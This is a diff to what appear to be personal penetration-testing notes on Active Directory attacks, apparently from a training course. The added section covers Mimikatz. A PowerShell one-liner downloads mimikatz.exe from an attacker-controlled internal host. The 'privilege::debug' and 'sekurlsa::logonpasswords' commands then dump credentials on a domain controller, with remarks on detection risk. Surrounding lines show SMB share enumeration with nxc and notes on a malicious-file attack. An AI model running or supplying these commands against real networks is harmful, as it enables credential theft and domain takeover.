@@ -266,6 +266,18 @@ nxc smb <target_ip_or_range> -u <username> -p <password> -d <domain> --shares
 #NOTE. attack worked when http service was on (and no relay setup, but probably works with http off and relaying), BUT I needed to manually open the file
 # When opening even with AV off WIndows says file may be harmful
 
+Mimikatz
+Program to obtain credentials from memory
+# EXTREMELY TARGETED and signatured. VERY dangerous, also VERY monitored
+# Use on DC, try to obtain cmd execution on DC
+powershell -c "wget http://192.168.1.253/mimikatz.exe -OutFile mimikatz.exe"
+# wiki for help
+https://github.com/gentilkiwi/mimikatz/wiki
+mimikatz.exe
+privilege::debug #bypass memory protections
+sekurlsa::logonpasswords
+#mimikatz x86 can't access x64 processes
+
 
 # TO DO TEST LATER:
 # It seems it doesn't auto open as it's not trusted, perhaps changing the domain (used blah domain because of TCM) or making it a trusted zone can make attack more dangerous?
